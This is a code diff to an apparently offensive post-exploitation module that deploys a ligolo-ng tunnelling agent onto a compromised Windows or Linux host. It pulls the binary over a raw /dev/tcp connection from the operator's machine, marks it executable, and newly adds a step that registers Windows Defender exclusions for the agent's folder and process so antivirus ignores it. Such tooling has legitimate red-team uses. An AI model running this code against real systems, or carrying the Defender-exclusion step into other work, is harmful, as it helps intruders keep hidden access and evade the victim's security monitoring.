@@ -114,13 +114,14 @@ class LigoloModule(KoiModule):
     def _upload_bytes(self, raw: bytes, dest: str) -> bool:
         """Upload *raw* bytes to *dest* on the target via a side TCP connection."""
         local_ip = self._get_local_ip()
+        transfer_timeout = max(60, len(raw) // 50_000 + 30)
         bar = self.ui.ProgressBar(total=len(raw))
-        port, t, errors = spawn_send_server(raw, timeout=60, on_progress=lambda sent: bar.update(sent))
+        port, t, errors = spawn_send_server(raw, timeout=transfer_timeout, on_progress=lambda sent: bar.update(sent))
 
         if self.session.os_type == "linux":
             self.exec(
                 f"cat < /dev/tcp/{local_ip}/{port} > {dest}",
-                timeout=60,
+                timeout=transfer_timeout,
             )
         else:
             ps_cmd = (
@@ -140,18 +141,21 @@ class LigoloModule(KoiModule):
             else:
                 self.sendline(ps_cmd)
 
-        t.join(timeout=60)
+        t.join(timeout=transfer_timeout)
         bar.done()
         print()
 
         if errors:
             return False
 
-        time.sleep(1.0)
+        time.sleep(1.5)
 
         if self.session.os_type == "linux":
-            result = self.exec(f"test -f {dest} && echo OK || echo MISS")
-            return "OK" in result.stdout
+            result = self.exec(f"test -s {dest} && echo OK || echo MISS")
+            if "OK" not in result.stdout:
+                return False
+            self.exec(f"chmod +x {dest}")
+            return True
         else:
             check = self._win_query(f"(Test-Path '{dest}').ToString()")
             return check.strip().lower() == "true"
@@ -198,9 +202,20 @@ class LigoloModule(KoiModule):
         if self.args.output:
             dest = self.args.output
         elif os_name == "windows":
-            dest = f"C:\\Windows\\Temp\\agent.exe"
+            cwd = self._win_query("(Get-Location).Path").strip() or "C:\\Windows\\Temp"
+            dest = cwd + "\\agent.exe"
         else:
-            dest = "/tmp/agent"
+            cwd = self._exec_clean("pwd").strip() or "/tmp"
+            dest = cwd + "/agent"
+
+        if os_name == "windows":
+            import ntpath
+            dest_dir = ntpath.dirname(dest)
+            with self.spinner("Adding Defender exclusion…"):
+                self._win_query(
+                    f"Add-MpPreference -ExclusionPath '{dest_dir}' -ExclusionProcess '{dest}'"
+                )
+            self.status(f"Defender exclusion added for {dest_dir}")
 
         self.status(f"Uploading to {dest}…")
         ok = self._upload_bytes(agent_bytes, dest)
@@ -208,9 +223,6 @@ class LigoloModule(KoiModule):
         if not ok:
             self.err("Upload failed or file not present on target after transfer.")
             return
-
-        if os_name == "linux":
-            self.exec(f"chmod +x {dest}")
 
         print()
         self.box("ligolo-ng agent deployed", {
